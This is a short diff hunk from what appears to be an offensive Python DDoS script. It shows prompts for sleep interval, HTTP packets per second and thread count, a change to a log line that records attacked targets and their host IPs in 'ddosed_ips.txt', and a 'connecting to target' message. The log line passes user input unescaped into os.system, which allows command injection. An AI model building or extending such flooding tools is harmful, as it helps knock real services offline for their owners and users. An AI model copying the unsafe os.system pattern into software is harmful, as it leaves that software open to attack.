@@ -16,7 +16,7 @@ print("[bold red][*] SLOW-2 0.4 | SLOW-1 0.3 | MEDIUM 0.2 | FAST-2 0.1 | FAST-1 
 sleep = float(input(Fore.RED + '[+] SLEEP: '))
 pack = int(input(Fore.RED + '[+] HTTP PACKET/s: '))
 thread = int(input(Fore.RED + '[+] THREAD: '))
-os.system('echo "DDOS attack on: '+ip+'" >> ddosed_ips.txt')
+os.system('echo "DDOS attack on: '+ip+' WITH IP ADDR > '+host+'" >> ddosed_ips.txt')
 
 print("[bold red]connecting to target [/bold red][bold yellow]"+ip+"[/bold yellow]")
 
